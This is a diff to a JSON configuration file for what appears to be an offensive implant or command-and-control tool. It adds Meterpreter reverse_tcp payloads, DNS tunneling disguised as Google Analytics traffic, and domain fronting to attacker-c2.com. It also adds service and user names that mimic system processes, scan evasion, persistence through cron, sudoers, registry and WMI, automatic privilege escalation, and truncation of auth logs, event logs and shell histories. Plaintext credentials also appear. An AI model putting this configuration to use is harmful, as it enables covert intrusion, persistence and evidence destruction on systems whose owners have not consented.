@@ -11,32 +11,141 @@
     "password": "Eu_2J84CcX.9-xnv",
     "description": "Configuración para envío de reportes por SSH/SCP"
   },
+  "c2_config": {
+    "meterpreter": {
+      "enabled": true,
+      "payload_type": "linux/x64/meterpreter/reverse_tcp",
+      "windows_payload": "windows/x64/meterpreter/reverse_tcp",
+      "encryption": true,
+      "stager_retry_count": 3,
+      "stager_retry_wait": 5
+    },
+    "dns_tunneling": {
+      "enabled": true,
+      "domain": "cdn.google-analytics.com",
+      "subdomain": "analytics",
+      "dns_server": "8.8.8.8"
+    },
+    "domain_fronting": {
+      "enabled": true,
+      "front_domain": "cloudflare.com",
+      "real_domain": "attacker-c2.com",
+      "cdn_provider": "cloudflare"
+    },
+    "jitter": {
+      "enabled": true,
+      "min_interval": 30,
+      "max_interval": 300,
+      "random_factor": 0.3
+    }
+  },
+  "stealth": {
+    "obfuscated_names": {
+      "linux_user": "systemd-resolver",
+      "windows_user": "udisks-helper",
+      "service_name": "gdm-session",
+      "binary_name": "rsync",
+      "script_name": "update.sh"
+    },
+    "hidden_directories": [
+      "/tmp/.X11-unix/",
+      "/var/lib/dbus/",
+      "/usr/share/doc/",
+      "/opt/.cache/",
+      "C:\\Windows\\Temp\\",
+      "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+    ],
+    "scan_evasion": {
+      "nmap_options": "-sS -T2 --scan-delay 1-3 --randomize-hosts",
+      "decoy_ips": "RND:10",
+      "fragment_packets": true,
+      "spoof_mac": true
+    }
+  },
   "persistence": {
-    "ssh_port": 2222,
-    "vpn_port": 1194,
-    "web_port": 8080,
-    "proxy_port": 1080,
-    "dns_port": 53,
-    "ftp_port": 21,
-    "rdp_port": 3389,
-    "telnet_port": 23,
-    "vnc_port": 5900,
-    "smb_port": 445,
-    "rpc_port": 135,
-    "netbios_port": 139,
-    "http_port": 80,
-    "https_port": 443
+    "linux": {
+      "cron_jobs": true,
+      "bashrc_modification": true,
+      "profile_modification": true,
+      "systemd_service": true,
+      "ssh_keys": true,
+      "sudoers_modification": true
+    },
+    "windows": {
+      "registry_run": true,
+      "scheduled_tasks": true,
+      "wmi_event_subscriptions": true,
+      "startup_folder": true,
+      "service_installation": true,
+      "dll_hijacking": true
+    },
+    "ports": {
+      "ssh_port": 2222,
+      "vpn_port": 1194,
+      "web_port": 8080,
+      "proxy_port": 1080,
+      "dns_port": 53,
+      "ftp_port": 21,
+      "rdp_port": 3389,
+      "telnet_port": 23,
+      "vnc_port": 5900,
+      "smb_port": 445,
+      "rpc_port": 135,
+      "netbios_port": 139,
+      "http_port": 80,
+      "https_port": 443
+    }
+  },
+  "privilege_escalation": {
+    "linux_tools": [
+      "linpeas.sh",
+      "linux-exploit-suggester.sh",
+      "linuxprivchecker.py"
+    ],
+    "windows_tools": [
+      "winpeas.exe",
+      "accesschk.exe",
+      "powerup.ps1"
+    ],
+    "auto_exploit": true,
+    "exploit_timeout": 300
+  },
+  "ssh_tunneling": {
+    "enabled": true,
+    "reverse_tunnel_port": 2222,
+    "local_forwarding": true,
+    "dynamic_port_forwarding": true,
+    "keep_alive": true,
+    "compression": true
+  },
+  "log_cleanup": {
+    "linux_logs": [
+      "/var/log/auth.log",
+      "/var/log/secure",
+      "/var/log/messages",
+      "/var/log/syslog",
+      "/var/log/wtmp",
+      "/var/log/lastlog",
+      "~/.bash_history",
+      "~/.zsh_history"
+    ],
+    "windows_logs": [
+      "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
+      "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
+      "C:\\Windows\\System32\\winevt\\Logs\\Application.evtx"
+    ],
+    "cleanup_method": "truncate"
   },
   "credentials": {
-    "ssh_user": "svc_ssh",
-    "ssh_password": "SSH_P@ssw0rd_2024!",
+    "ssh_user": "systemd-resolver",
+    "ssh_password": "System_Res0lver_2024!",
     "web_user": "admin",
     "web_password": "Web_P@ssw0rd_2024!",
     "vpn_user": "vpn_client",
     "vpn_password": "VPN_P@ssw0rd_2024!",
-    "proxy_user": "svc_proxy",
+    "proxy_user": "udisks-helper",
     "proxy_password": "Proxy_P@ssw0rd_2024!",
-    "ftp_user": "svc_ftp",
+    "ftp_user": "gdm-session",
     "ftp_password": "FTP_P@ssw0rd_2024!",
     "rdp_user": "svc_rdp",
     "rdp_password": "RDP_P@ssw0rd_2024!",
